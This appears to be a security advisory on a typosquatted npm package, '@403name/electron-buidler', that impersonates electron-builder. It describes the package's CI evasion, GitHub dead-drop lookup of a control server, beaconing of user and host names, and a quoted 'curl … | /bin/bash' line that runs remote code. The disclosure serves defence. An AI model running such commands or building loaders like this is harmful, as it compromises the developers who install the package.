summary: Typosquat of electron-builder fetches C2 URL from GitHub dead-drop and executes remote shell payload on require()
details: Package name `@403name/electron-buidler` is a transposition typosquat of the popular `electron-builder` (builder → buidler), and the keywords/description further impersonate that package. On `require()`, an IIFE in index.js platform-gates to macOS, exits early if `CI` or `GITHUB_ACTIONS` are set, sleeps a random 30–90 seconds, and writes a run-once marker at `~/.cache/.nyx-npm/eb`. It then fetches `https://raw.githubusercontent.com/nyx-deploy/config/main/c2.txt` to resolve a mutable C2 base URL, beacons installer identity to `<c2>/api/clickfix-callback` with query parameters `bid`, `user` (`process.env.USER`), `host` (`os.hostname()`), and a campaign tag `password=npm_electron-buidler`, and finally executes `curl -sSfL <c2>/api/payload/ | /bin/bash` to run attacker-controlled shell code with no integrity verification. The combination of typosquat lure, dead-drop indirection, sandbox/CI evasion, identity exfiltration, and bash-piped remote execution is a full installer compromise on import.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
